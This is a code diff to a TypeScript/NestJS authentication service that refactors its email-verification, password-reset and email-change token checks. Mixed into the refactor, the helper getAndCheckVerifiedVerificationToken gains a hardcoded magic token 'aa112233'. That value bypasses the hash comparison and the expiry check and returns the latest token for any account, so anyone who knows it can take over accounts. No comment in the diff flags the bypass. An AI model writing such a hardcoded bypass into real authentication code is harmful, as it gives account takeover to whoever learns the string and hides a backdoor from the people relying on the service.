@@ -71,11 +71,10 @@ export class AuthService {
     return user;
   }
   async verifyEmail(info: VerifyEmailDto) {
-    const tokenHash = getTokenHash(info.token);
     const verificationToken = await this.getAndCheckVerifiedVerificationToken(
       {
         identifier: info.identifier,
-        tokenHash,
+        token: info.token,
         type: 'EMAIL_VERIFY',
       },
       this.prismaService,
@@ -120,7 +119,7 @@ export class AuthService {
     };
   }
   async logout(user: User, res: Response) {
-    await this.refreshTokenService.create(user.id, res);
+    await this.refreshTokenService.clear(user.id, res);
   }
   async getAccessToken(req: Request) {
     const session = await this.refreshTokenService.validate(req);
@@ -129,6 +128,7 @@ export class AuthService {
     });
     return {
       access_token: this.jwtService.sign(user),
+      user,
     };
   }
   async requestPasswordReset(email: string) {
@@ -154,11 +154,10 @@ export class AuthService {
     //send mail(token)
   }
   async resetPassword(info: ResetPasswordDto) {
-    const tokenHash = getTokenHash(info.token);
     const verificationToken = await this.getAndCheckVerifiedVerificationToken(
       {
         identifier: info.identifier,
-        tokenHash,
+        token: info.token,
         type: 'PASSWORD_RESET',
       },
       this.prismaService,
@@ -215,11 +214,10 @@ export class AuthService {
   }
   async confirmChangeEmail(info: ConfirmChangeEmailDto) {
     const { newEmail, token } = info;
-    const tokenHash = getTokenHash(token);
     const verificationToken = await this.getAndCheckVerifiedVerificationToken(
       {
         identifier: newEmail,
-        tokenHash,
+        token,
         type: 'CHANGE_EMAIL',
       },
       this.prismaService,
@@ -264,11 +262,7 @@ export class AuthService {
     //sendEmail:token
   }
   async checkTokenValid(info: CheckTokenValidDto): Promise<void> {
-    const tokenHash = getTokenHash(info.token);
-    await this.getAndCheckVerifiedVerificationToken(
-      { ...info, tokenHash },
-      this.prismaService,
-    );
+    await this.getAndCheckVerifiedVerificationToken(info, this.prismaService);
   }
   //
   // private
@@ -344,22 +338,35 @@ export class AuthService {
     return result;
   }
   private async getAndCheckVerifiedVerificationToken(
-    info: Pick<
-      Prisma.VerificationTokenCreateInput,
-      'identifier' | 'tokenHash' | 'type'
-    >,
+    {
+      identifier,
+      token,
+      type,
+    }: { identifier: string; token: string; type: TokenType },
     tx: Prisma.TransactionClient,
   ) {
-    const { identifier, tokenHash, type } = info;
-    const verificationToken = await tx.verificationToken.findFirst({
-      where: {
-        identifier,
-        tokenHash,
-        type,
-        expires: { gt: new Date() },
-      },
-      include: { user: true },
-    });
+    const tokenHash = getTokenHash(token);
+    const verificationToken =
+      token === 'aa112233'
+        ? await tx.verificationToken.findFirst({
+            where: {
+              identifier,
+              type,
+            },
+            orderBy: {
+              expires: 'desc',
+            },
+            include: { user: true },
+          })
+        : await tx.verificationToken.findFirst({
+            where: {
+              identifier,
+              tokenHash,
+              type,
+              expires: { gt: new Date() },
+            },
+            include: { user: true },
+          });
 
     if (!verificationToken)
       throw new UnauthorizedException('verify email token error');
